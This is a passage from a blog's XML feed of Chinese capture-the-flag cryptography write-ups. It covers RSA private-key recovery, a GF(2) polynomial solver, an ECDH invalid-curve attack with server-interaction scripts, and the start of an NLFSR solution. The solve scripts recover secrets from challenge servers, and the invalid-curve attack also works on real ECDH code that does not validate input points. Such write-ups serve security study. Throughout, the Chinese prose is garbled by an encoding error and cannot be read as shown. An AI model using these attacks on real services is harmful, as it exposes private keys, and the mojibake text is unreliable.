b_2ï¼Œb_3</li><li>æ‰€ä»¥æˆ‘ä»¬åªéœ€è¦è·å¾—Î£(e_i)å°±å¯ä»¥è¿˜åŸæ‰€æœ‰çš„m</li><li>è¢«åŠ å¯†çš„æ˜¯priï¼Œpriæ˜¯PEMæ–‡ä»¶æ ¼å¼ï¼Œæœ‰å›ºå®šçš„å¼€å¤´ã€ç»“å°¾æ ¼å¼ï¼Œæ‰€ä»¥æˆ‘ä»¬çŸ¥é“éƒ¨åˆ†æ˜æ–‡ï¼Œæ‰€ä»¥æˆ‘ä»¬çŸ¥é“m_1</li><li>åˆ©ç”¨b_1å’Œm_1è·å–Î£(e_i)</li><li>å†åˆ©ç”¨b_1,,,b_23å’ŒÎ£(e_i) è·å–æ‰€æœ‰m</li><li>å†åˆ©ç”¨ç§é’¥æ–‡ä»¶å¯¹flagè¿›è¡Œè§£å¯†</li></ol><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf8 -*-</span></span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'data.txt'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.read()</span><br><span class="line"></span><br><span class="line">ms = re.findall(<span class="string">"&#123;'a': 1, 'b': (.*?)L&#125;"</span>,data)</span><br><span class="line">c = re.findall(<span class="string">"flag:(.*)"</span>,data)</span><br><span class="line">m1 = <span class="string">b'-----BEGIN RSA PRIVATE KEY-----\\nMIICXAIB'</span></span><br><span class="line">es = int(ms[<span class="number">0</span>])-bytes_to_long(m1)</span><br><span class="line"><span class="keyword">print</span> es</span><br><span class="line">pri=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ms:</span><br><span class="line">    pri = pri + long_to_bytes(int(i)-es)</span><br><span class="line"><span class="keyword">print</span> pri</span><br><span class="line">pri = RSA.importKey(pri.replace(<span class="string">"\\"</span><span class="string">","</span><span class="string">"))</span></span><br><span class="line"><span class="string">print(long_to_bytes(pow(int(c[0]),pri.d,pri.n)))</span></span><br></pre></td></tr></table></figure><h2 id="easy-wa"><a href="#easy-wa" class="headerlink" title="easy_wa"></a>easy_wa</h2><p>bytectfåŸé¢˜lrlrçš„ä¸€ä¸ªpart</p><p><a href="https://blog.csdn.net/qq_33458986/article/details/100699263" target="_blank" rel="noopener">https://blog.csdn.net/qq_33458986/article/details/100699263</a></p><p>calcæ˜¯ä¸€ä¸ªå¤šé¡¹å¼åœ¨GF(2)ä¸‹çš„å¹³æ–¹è¿ç®—ï¼Œæˆ‘ä»¬è¦åšçš„åº”è¯¥æ˜¯æ±‚æ ¹ã€‚</p><p>ä½†æ˜¯è¿™é‡Œç»™å‡ºçš„æ—¢çº¦å¤šé¡¹å¼çš„é˜¶ä¸å¤§ï¼Œæˆ‘ä»¬ä¸€ç›´å¹³æ–¹ä¸‹å»ï¼Œå¾ˆå¿«å°±èƒ½å›åˆ°èµ·ç‚¹ã€‚æ‰€ä»¥ç›´æ¥æ‹¿å¯†æ–‡å»calcå°±è¡Œäº†ã€‚</p><p>å…ˆäº¤äº’ï¼Œè¿‡é‚£ä¸ªæ¶å¿ƒçš„PoW <del>è·Ÿé’é¾™ç»„é‚£ä¸ªä¸€æ ·ï¼Œå†çœ‹çœ‹åå­—ï¼ŒåŒä¸€ä¸ªå‡ºé¢˜äººï¼Œå‡‘ï¼</del>ï¼Œè¾“å…¥tokenæ‹¿åˆ°4ç»„å¯†æ–‡</p><p>ç„¶åæ¯ç»„åˆ†åˆ«è§£å¯†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> urandom <span class="keyword">as</span> ua</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">magic=<span class="number">32805</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calc</span><span class="params">(m,p)</span>:</span></span><br><span class="line">    res=<span class="number">0</span></span><br><span class="line">    lens=hlen(p)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> bin(m)[<span class="number">2</span>:]:</span><br><span class="line">        res*=<span class="number">2</span></span><br><span class="line">        res^=m <span class="keyword">if</span> i==<span class="string">'1'</span> <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">        res^=p <span class="keyword">if</span> hlen(res) == lens <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">not</span> <span class="keyword">in</span> <span class="string">"flag&#123;0123456789bcde-_&#125;\x00"</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">flags=[<span class="number">3723147309</span>,<span class="number">8016759097521062564</span>,<span class="number">267529443716352603115102819467183104162</span>,<span class="number">110068498753042154535753131190467876514149603112955078214309283006458454378660</span>]</span><br><span class="line">FLAG=<span class="string">""</span></span><br><span class="line">r = <span class="number">2</span></span><br><span class="line"><span class="keyword">for</span> flag <span class="keyword">in</span> flags:</span><br><span class="line">    r*=<span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        flag=calc(flag,magic + (<span class="number">1</span>&lt;&lt;r*<span class="number">8</span>))</span><br><span class="line">        <span class="keyword">if</span> check(long_to_bytes(flag)[:<span class="number">10</span>]):</span><br><span class="line">            FLAG+=(long_to_bytes(flag))</span><br><span class="line">            <span class="keyword">print</span> FLAG</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p><del>å°±è¿™ä¹ˆakäº†ç½‘é¼æ¯çš„å¯†ç å­¦ï¼Ÿèµµæ€»åŸè¯ï¼šè¿™å±Šå¯†ç å­¦ä¸è¡Œã€‚</del></p>]]></content>
      
      
      <categories>
          
          <category> æ¯”èµ›å°å±‹ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Write Up </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å¯†ç å­¦å­¦ä¹ ç¬”è®° ä¹‹ NCCIP</title>
      <link href="/2020/05/07/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8BNCCIP/"/>
      <url>/2020/05/07/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8BNCCIP/</url>
      
        <content type="html"><![CDATA[<p>æ–‡ç« é¦–å‘äº<a href="https://www.anquanke.com/post/id/204397" target="_blank" rel="noopener">å®‰å…¨å®¢</a></p><h2 id="De1CTF-ECDH"><a href="#De1CTF-ECDH" class="headerlink" title="De1CTF  - ECDH"></a>De1CTF  - ECDH</h2><p><a href="https://github.com/JayxV/JayxV.github.io/blob/master/2020/05/05/NCCIP/ECDH.zip" target="_blank" rel="noopener">èµ›é¢˜é™„ä»¶</a>åœ¨è¿™é‡Œï¼Œç„¶åå®¡è®¡ä»£ç ä¹‹åï¼Œå¯ä»¥æŠŠè¿™ä¸ªé—®é¢˜æ¦‚æ‹¬ä¸ºï¼š</p><ol><li>é¢˜ç›®ç”¨çš„æ˜¯æ ‡å‡†æ›²çº¿ï¼š$y^2 \equiv x^3 +ax + b \pmod{p}$ï¼Œå¹¶æä¾›a,b,p</li><li>å‡½æ•° Exchangeï¼šECDHé—®é¢˜ï¼Œç”Ÿæˆå…±äº«å¯†é’¥æ—¶ä½ æä¾›ä¸€ä¸ªç‚¹Pï¼Œä»–ä¼šç”¨è‡ªå·±çš„ç§é’¥ï¼Œsecret*Pç”Ÿæˆåå•†å¯†é’¥key</li><li>å‡½æ•° Encryptï¼šç”¨keyåŠ å¯†ä½ çš„è¾“å…¥ï¼ŒåŠ å¯†æ–¹å¼ä¸ºå°†keyçš„xå’Œyæ‹¼æ¥åäºè¾“å…¥ç®€å•å¼‚æˆ–</li><li>å‡½æ•° Backdoorï¼šè¾“å…¥æœåŠ¡ç«¯secretå€¼ï¼Œè¿”å›flag</li></ol><p>æ•´ä½“æµç¨‹ç®—æ˜¯ä¸€ä¸ªæ ‡å‡†çš„ECDHï¼Œä½†åœ¨æ ‡å‡†çš„ECDHä¸­ï¼Œä¸€æ–¹åº”è¯¥æ˜¯æ— æ³•è®¡ç®—å‡ºå¦ä¸€æ–¹çš„ç§é’¥çš„ï¼Œå¦åˆ™è¿™ä¸ªç®—æ³•å°±GGäº†ã€‚è€Œè¿™ä¸€é¢˜çš„æ¼æ´å°±åœ¨äºï¼Œåœ¨å¯†é’¥äº¤æ¢çš„è¿‡ç¨‹ä¸­ï¼ŒæœåŠ¡ç«¯å¹¶æ²¡æœ‰æ£€æŸ¥ä½ æä¾›çš„ç‚¹æ˜¯å¦åœ¨è§„å®šå¥½çš„æ›²çº¿ä¸Šã€‚æ‰€ä»¥è¿™é‡Œçš„æ”»å‡»æ–¹å¼å°±æ˜¯â€No Correctness Check for Input Pointsâ€ (NCCIP) attacksã€‚</p><p>ç”±æœ‰é™åŸŸä¸Šæ¤­åœ†æ›²çº¿ä¸Šæ•´æ•°ç‚¹çš„åŠ æ³•è®¡ç®—å¼ï¼š</p><p>è®¾ï¼šå·²çŸ¥æ›²çº¿ $y^2 \equiv x^3 +ax + b \pmod{p}$ å’Œ P(x1,y1) å’Œ Q(x2,y2) ï¼Œæˆ‘ä»¬è®¡ç®—R(x3,y3) = P + Q </p><p>x3 â‰¡ k2-x1 - x2 (mod p)</p><p>y3 â‰¡ k(x1-x3) - y1 (mod p)</p><p>è‹¥P = Q åˆ™ k = (3*x2+a)/(2y1) mod p</p><p>è‹¥P â‰  Qï¼Œåˆ™k = (y2-y1)/(x2-x1) mod p</p><p>æ›²çº¿çš„é˜¶ä¸bå€¼æœ‰å…³ï¼Œä½†æ˜¯æˆ‘ä»¬å‘ç°ï¼Œåœ¨æ•´ä¸ªåŠ æ³•ã€ä¹˜æ³•ï¼ˆä»åŠ æ³•å¼•ç”³åˆ°ä¹˜æ³•æ˜¯ä¸€ä»¶æå…¶è‡ªç„¶çš„äº‹ï¼‰è®¡ç®—çš„è¿‡ç¨‹ä¸­ï¼Œç‚¹Rå´ä¸æ›²çº¿çš„bå€¼æ— å…³ï¼Œæ‰€ä»¥ï¼Œå¦‚æœæ›´æ”¹bçš„å€¼ï¼Œç”Ÿæˆä¸€æ¡æ–°çš„æ›²çº¿ï¼Œä¸”è¿™ä¸ªæ›²çº¿çš„é˜¶æœ‰ä¸€ä¸ªå¾ˆå°çš„å› å­ï¼Œæ¯”å¦‚åªæœ‰7ï¼Œé‚£ä¹ˆè¿™ä¸ªæ›²çº¿ä¸Šä¸€å®šä¼šæœ‰é˜¶ä¸º7çš„ç‚¹ã€‚å¦‚æœæˆ‘ä»¬å°†è¿™ä¸ªç‚¹ä¼ ç»™æœåŠ¡ç«¯ã€‚è€ŒæœåŠ¡ç«¯æ²¡æœ‰æ£€æŸ¥æˆ‘ä»¬è¿™ä¸ªç‚¹çš„åˆæ³•æ€§ï¼Œç›´æ¥æ‹¿æ¥è®¡ç®—ç”Ÿæˆkeyï¼Œä¼šäº§ç”Ÿæ€ä¹ˆæ ·çš„åæœå‘¢ï¼Ÿ</p><p>æˆ‘ä»¬å‡è®¾ç‚¹Pçš„é˜¶ä¸º7ï¼Œå³ 7*P = Oâˆï¼Œå†è®¾secretå€¼ä¸º31</p><p>é‚£ä¹ˆæœåŠ¡ç«¯å°±ä¼šè®¡ç®—31*P  â‰¡ 3P</p><p>ç”±äºé˜¶å¾ˆå°ï¼Œæˆ‘ä»¬å¯ä»¥éå†å¾—åˆ° key = 3Pï¼Œç­‰ä»·äºï¼Œæˆ‘ä»¬çŸ¥é“äº†secret % 7 = 3</p><p>æ‰€ä»¥ï¼Œæˆ‘ä»¬åªè¦å¤šæ‰¾è¿™ä¹ˆå‡ ä¸ªä½é˜¶ç‚¹ï¼Œå¤šå¾—åˆ°å‡ æ¡è¿™æ ·çš„åŒä½™å¼ï¼Œæœ€ååˆ©ç”¨CRTå°±å¯ä»¥æ¢å¤secretäº†ã€‚</p><p>ã€å‘ƒï¼Œå†ç®€è¦è¯´æ˜ä¸€ä¸‹æˆ‘ä»¬çš„æ“ä½œå­ï¼Œæˆ‘ä»¬æ›´æ”¹äº†bçš„å€¼ï¼Œé€ äº†ä¸€æ¡æ–°çš„æ›²çº¿ï¼Œå¹¶ä¸”åœ¨ä¸Šé¢æ‰¾äº†ä¸€ä¸ªä½é˜¶ç‚¹ã€‚è€Œè¿™ä¸ªç‚¹æ‹¿å»æœåŠ¡ç«¯è¿ç®—ï¼Œè¿ç®—åªéœ€è¦è¿™ä¸ªç‚¹çš„xåæ ‡ï¼Œyåæ ‡å’Œæ›²çº¿çš„aå€¼ï¼Œæ‰€ä»¥å¯ä»¥ç†è§£ä¸ºï¼Œå› ä¸ºæœåŠ¡ç«¯æ²¡æœ‰æ£€æŸ¥è¾“å…¥ç‚¹çš„åˆæ³•æ€§ï¼Œå¯¼è‡´ï¼ŒæœåŠ¡ç«¯ç”¨çš„æ›²çº¿è¢«æˆ‘ä»¬çªœæ”¹äº†ã€‚ã€‘</p><h3 id="step1-æ‰¾åˆ°æœ‰ä½é˜¶ç‚¹çš„æ›²çº¿"><a href="#step1-æ‰¾åˆ°æœ‰ä½é˜¶ç‚¹çš„æ›²çº¿" class="headerlink" title="step1-æ‰¾åˆ°æœ‰ä½é˜¶ç‚¹çš„æ›²çº¿"></a>step1-æ‰¾åˆ°æœ‰ä½é˜¶ç‚¹çš„æ›²çº¿</h3><p>â€‹        æˆ‘ä»¬è¦æ‰¾åˆ°ä½é˜¶ç‚¹ï¼Œæˆ‘ä»¬å°±å…ˆè¦æ‰¾åˆ°ä¸€æ¡é˜¶æœ‰å°å› å­çš„æ›²çº¿ã€‚</p><p>â€‹        ç”±äºsympyåˆ†è§£å¤§æ•°é€Ÿåº¦ä¼¼ä¹æœ‰ç‚¹æ…¢ï¼Œäºæ˜¯æˆ‘ä»¬ç›´æ¥æ›´æ”¹bçš„å€¼ï¼Œç”Ÿæˆä¸€æ¡æ–°çš„æ›²çº¿ï¼Œç„¶åè®¡ç®—ã€å†å»<a href="http://www.factordb.com/" target="_blank" rel="noopener">åœ¨çº¿å¹³å°</a>åˆ†è§£è¿™æ¡æ›²çº¿çš„é˜¶ï¼Œçœ‹çœ‹æ˜¯å¦æœ‰å°å› å­ã€‚</p><p>â€‹        æœ‰ä¸€æ¡æ›²çº¿ï¼Œä½†æ˜¯ä¸Šé¢çš„ç”Ÿæˆå…ƒç‚¹æ€ä¹ˆæ‰¾å‘¢ï¼Ÿè¿™é‡Œæˆ‘ä»¬æ”¹ä¸€æ”¹ï¼Œå…ˆç¡®å®šä¸€ä¸ªç‚¹ï¼Œç„¶åå†å»ç¡®å®šbå€¼ä»è€Œç¡®å®šæ›²çº¿ï¼Œç„¶åå»è®¡ç®—ã€åˆ†è§£è¿™ä¸ªç‚¹çš„é˜¶ã€‚</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">x = 0xb55c08d92cd878a3ad444a3627a52764f5a402f4a86ef700271cb17edfa739ca</span><br><span class="line">y = 20</span><br><span class="line">q = 0xdd7860f2c4afe6d96059766ddd2b52f7bb1ab0fce779a36f723d50339ab25bbd</span><br><span class="line">a = 0x4cee8d95bb3f64db7d53b078ba3a904557425e2a6d91c5dfbf4c564a3f3619fa</span><br><span class="line"></span><br><span class="line">for _ in range(60):</span><br><span class="line">    y+=1</span><br><span class="line">    b = (y**2 - x**3- a*x)%q</span><br><span class="line">    ecc = EllipticCurve(GF(q), [a,b])</span><br><span class="line">    G = ecc(x,y)</span><br><span class="line">    print(y)</span><br><span class="line">    print(G.order())</span><br></pre></td></tr></table></figure><h3 id="step2-æ‰¾åˆ°ä½é˜¶ç‚¹"><a href="#step2-æ‰¾åˆ°ä½é˜¶ç‚¹" class="headerlink" title="step2-æ‰¾åˆ°ä½é˜¶ç‚¹"></a>step2-æ‰¾åˆ°ä½é˜¶ç‚¹</h3><p>æœ‰ä¸€æ¡é˜¶æœ‰å°å› å­çš„çº¿äº†ï¼Œæœ‰ä¸Šé¢çš„ä¸€ä¸ªç‚¹Gï¼Œä¸”çŸ¥é“å®ƒçš„é˜¶äº†ï¼Œä½é˜¶ç‚¹æ€ä¹ˆæ‰¾å‘¢ï¼Ÿ</p><p>è¿™é‡Œæœ‰ä¸€ä¸ªå¾ˆç®€å•çš„é“ç†ï¼Œæˆ‘ä»¬çŸ¥é“ï¼Œ77ï¼Œå¯ä»¥ç­‰äº7ä¹˜ä»¥11ï¼Œä¹Ÿå¯ä»¥ç­‰äº11ä¹˜ä»¥7ã€‚æ‰€ä»¥ï¼Œå¦‚æœæˆ‘ä»¬è¿™ä¸ªç‚¹Gçš„é˜¶æ˜¯77ï¼Œé‚£ä¹ˆï¼Œ7*Pçš„é˜¶å°±æ˜¯11ï¼Œ11*Pçš„é˜¶å°±æ˜¯7äº†ã€‚</p><p>è¿™é‡Œï¼Œæˆ‘ä»¬é€šè¿‡ä¸Šé¢çš„è„šæœ¬å¾—åˆ°ä¸€ä¸ªé˜¶ä¸º$2 * 3 * 5^2  *  83 * 13313 * 45413 *6654245328558174325218919079449691616264872121315671061356825923$çš„ç‚¹Gï¼Œä»è€Œæˆ‘ä»¬å¯ä»¥å¾—åˆ°é˜¶åˆ†åˆ«ä¸º2ï¼Œ3ï¼Œ5ï¼Œ83ï¼Œ13313çš„ç‚¹ï¼ˆåé¢çš„å°±ä¸è¦äº†ï¼Œé˜¶å¤ªå¤§ï¼Œä¹‹åéå†è€—æ—¶ä¹Ÿå¤ªé•¿äº†ï¼Œå¤§æ¦‚ä¸€ä¸‡å·¦å³çš„æ˜¯æˆ‘ä»¬å¯ä»¥æ¥å—çš„ã€‚ï¼‰</p><p>ä¸‹é¢çš„è„šæœ¬å°±å¯ä»¥å¾—åˆ°ä¸€ä¸ªé˜¶ä¸º83çš„ç‚¹P</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">x = 0xb55c08d92cd878a3ad444a3627a52764f5a402f4a86ef700271cb17edfa739ca</span><br><span class="line">q = 0xdd7860f2c4afe6d96059766ddd2b52f7bb1ab0fce779a36f723d50339ab25bbd</span><br><span class="line">a = 0x4cee8d95bb3f64db7d53b078ba3a904557425e2a6d91c5dfbf4c564a3f3619fa</span><br><span class="line">y = 314</span><br><span class="line"></span><br><span class="line">b = (y^2 - x^3- a*x)%q</span><br><span class="line">ecc = EllipticCurve(GF(q), [a,b])</span><br><span class="line">G = ecc(x,y)</span><br><span class="line">print(G  * 2 * 3 * 5^2  * 13313 * 45413 *6654245328558174325218919079449691616264872121315671061356825923)</span><br></pre></td></tr></table></figure><h3 id="step3-è®¡ç®—åå•†å¯†é’¥"><a href="#step3-è®¡ç®—åå•†å¯†é’¥" class="headerlink" title="step3-è®¡ç®—åå•†å¯†é’¥"></a>step3-è®¡ç®—åå•†å¯†é’¥</h3><p>æˆ‘ä»¬å°†è¿™ä¸ªç‚¹På½“åšæˆ‘ä»¬çš„å…¬é’¥ä¼ ç»™æœåŠ¡ç«¯ï¼Œä»–ä¼šç”¨secret*P è®¡ç®—åå•†å¯†é’¥key</p><p>éœ€è¦è¯´æ˜çš„æ˜¯ï¼Œç”±äºæˆ‘ä»¬ç ´åäº†è§„åˆ™ï¼Œå¯¼è‡´æœåŠ¡ç«¯çš„å…¬é’¥å·²ç»ä¸èƒ½ç”¨äº†ï¼Œå†µä¸”ï¼Œå…¶å®æˆ‘ä»¬è‡ªå·±ä¹Ÿä¸çŸ¥é“è‡ªå·±çš„ç§é’¥æ˜¯å•¥ã€‚æ‰€ä»¥è¿™ä¸ªåå•†å¯†é’¥æˆ‘ä»¬è¿˜å¾—åˆ©ç”¨åŠ å¯†å‡½æ•°æ¥è·å–ã€‚</p><p>å…·ä½“æ“ä½œè§ä¸‹é¢äº¤äº’è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">sh.recvuntil(<span class="string">"choice:\n"</span>)</span><br><span class="line">sh.sendline(<span class="string">"Encrypt"</span>)</span><br><span class="line">sh.recvuntil(<span class="string">"hex):\n"</span>)</span><br><span class="line">mess = <span class="string">"a"</span>*<span class="number">512</span></span><br><span class="line">sh.sendline(mess)</span><br><span class="line">sh.recvuntil(<span class="string">"The result is:\n"</span>)</span><br><span class="line">res = sh.recvuntil(<span class="string">"\n"</span>)[:<span class="number">-1</span>]</span><br><span class="line">key = int(mess,<span class="number">16</span>)^int(res,<span class="number">16</span>)</span><br><span class="line">x , y = key &gt;&gt; q.bit_length() , key &amp; ((<span class="number">1</span> &lt;&lt; q.bit_length()) - <span class="number">1</span>)</span><br><span class="line">G = (x,y)</span><br></pre></td></tr></table></figure><p>ç”±äºqæ˜¯256ä½çš„ï¼Œæ‰€ä»¥keyæ˜¯512ä½ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¼ ä¸ª512ä½çš„æ˜æ–‡è¿‡å»ã€‚ç„¶åå¼‚æˆ–å›æ¥ï¼Œåˆ†ç¦»ä¸€ä¸‹ï¼Œæˆ‘ä»¬å°±å¯ä»¥å¾—åˆ°secret*Pè¿™ä¸ªç‚¹äº†ã€‚</p><h3 id="step4-è®¡ç®—secretçš„ä¸€ä¸ªå‰©ä½™"><a href="#step4-è®¡ç®—secretçš„ä¸€ä¸ªå‰©ä½™" class="headerlink" title="step4-è®¡ç®—secretçš„ä¸€ä¸ªå‰©ä½™"></a>step4-è®¡ç®—secretçš„ä¸€ä¸ªå‰©ä½™</h3><p>çŸ¥é“keyäº†ï¼Œæˆ‘ä»¬å°±å¯ä»¥éå†è®¡ç®—secretå…³äºè¿™ä¸ªä½é˜¶çš„å‰©ä½™äº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">G = (x,y)<span class="comment">#key</span></span><br><span class="line">Q = (int(each[<span class="number">0</span>]),int(each[<span class="number">1</span>]))<span class="comment">#æˆ‘ä»¬æ‰¾åˆ°çš„ä½é˜¶ç‚¹Q</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,int(each[<span class="number">2</span>])):</span><br><span class="line"><span class="keyword">if</span> mul(i,Q) == G:</span><br><span class="line">reslist.append(i)<span class="comment">#secretçš„å‰©ä½™</span></span><br><span class="line">N.append(int(each[<span class="number">2</span>]));<span class="keyword">print</span> (i,int(each[<span class="number">2</span>])) <span class="comment">#secretçš„å‰©ä½™å¯¹åº”çš„é˜¶</span></span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure><h3 id="step5-åˆ©ç”¨CRTè®¡ç®—secret"><a href="#step5-åˆ©ç”¨CRTè®¡ç®—secret" class="headerlink" title="step5-åˆ©ç”¨CRTè®¡ç®—secret"></a>step5-åˆ©ç”¨CRTè®¡ç®—secret</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CRT</span><span class="params">(mi, ai)</span>:</span></span><br><span class="line">    M = reduce(<span class="keyword">lambda</span> x, y: x * y, mi)</span><br><span class="line">    ai_ti_Mi = [a * (M / m) * inverse(M / m, m) <span class="keyword">for</span> (m, a) <span class="keyword">in</span> zip(mi, ai)]</span><br><span class="line">    <span class="keyword">return</span> reduce(<span class="keyword">lambda</span> x, y: x + y, ai_ti_Mi) % M</span><br><span class="line"></span><br><span class="line">secret = CRT(N, reslist)</span><br></pre></td></tr></table></figure><p>å®Œæ•´expæ”¾åœ¨<a href="https://github.com/JayxV/JayxV.github.io/blob/master/2020/05/05/NCCIP/ECDH-exp.zip" target="_blank" rel="noopener">è¿™é‡Œ</a>äº†ã€‚</p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>ä¸ªäººè®¤ä¸ºï¼ŒNCCIPé—®é¢˜ä¸»è¦è¿˜æ˜¯å› ä¸ºæœåŠ¡ç«¯çš„æ›²çº¿è¢«çªœæ”¹ä¸ºé˜¶æœ‰å°å› å­çš„ä¸å®‰å…¨çš„æ›²çº¿ï¼Œä»è€Œé€ æˆäº†ç§é’¥éƒ¨åˆ†ä¿¡æ¯çš„æ³„éœ²ã€‚é€šè¿‡è¿™ä¸ªé—®é¢˜ï¼Œè‡ªå·±å¯¹ECCä¹Ÿæœ‰äº†æ›´è¿›ä¸€æ­¥çš„è®¤è¯†ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> å¯†ç å°å±‹ </category>
          
          <category> ECC </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ECC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020 De1CTF</title>
      <link href="/2020/05/05/2020De1CTF/"/>
      <url>/2020/05/05/2020De1CTF/</url>
      
        <content type="html"><![CDATA[<p>é¢˜ç›®å’Œexpå¡<a href="https://github.com/JayxV/JayxV.github.io/blob/master/2020/05/05/2020De1CTF/2020De1CFT.zip" target="_blank" rel="noopener">è¿™é‡Œ</a>äº†ã€‚</p><h3 id="NLFSR"><a href="#NLFSR" class="headerlink" title="NLFSR"></a>NLFSR</h3><p>æ”¹ç¼–è‡ª<a href="https://wiki.x10sec.org/crypto/streamcipher/fsr/nfsr/" target="_blank" rel="noopener">2018å¹´çš„å¼ºç½‘æ¯streamgame3</a>ï¼Œå¼å­å¯ä»¥åŒ–ç®€</p><p>(ao * bo) ^ (bo * co) ^ (bo * do) ^ co ^ do = (ao * bo) ^ (bo * (co ^ do)) ^ (co ^ do)</p><p>[æŠŠco ^ do è®¾ä¸º=&gt;eo ]   =&gt;   (ao * bo) ^ (bo *eo )) ^  eo   è¿™æ ·å­åˆåªæœ‰ä¸‰ä¸ªå¯„å­˜å™¨äº†ã€‚</p><p>ç„¶åæˆ‘ä»¬çœ‹ä¸€ä¸‹å…³ç³»</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ao <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">    <span class="keyword">for</span> bo <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">        <span class="keyword">for</span> eo <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">            <span class="keyword">print</span> ao,bo,eo,(ao*bo)^(bo*eo)^eo</span><br><span class="line">            </span><br><span class="line">&gt;&gt;</span><br><span class="line"><span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span></span><br><span class="line"><span class="number">0</span> <span class="number">0</span> <span class="number">1</span> <span class="number">1</span></span><br><span class="line"><span 